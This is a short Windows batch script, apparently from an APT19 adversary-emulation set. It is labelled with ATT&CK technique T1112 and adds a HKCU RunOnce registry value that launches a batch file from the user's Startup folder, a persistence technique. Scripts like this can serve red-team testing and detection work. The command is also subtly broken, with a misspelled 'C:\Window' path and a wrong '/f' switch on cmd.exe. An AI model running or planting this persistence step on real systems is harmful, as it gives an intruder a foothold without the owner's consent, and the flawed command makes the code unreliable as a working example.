@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Modify Registry (T1112)
ECHO.
ECHO [+] Modifing Existing Registry Entry
ECHO 	- HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
ECHO -------------------------------------------------------------------
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /t REG_SZ /v NextRun /d "C:\Window\System32\cmd.exe /f '%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\APT19_Startup.bat'"
ECHO.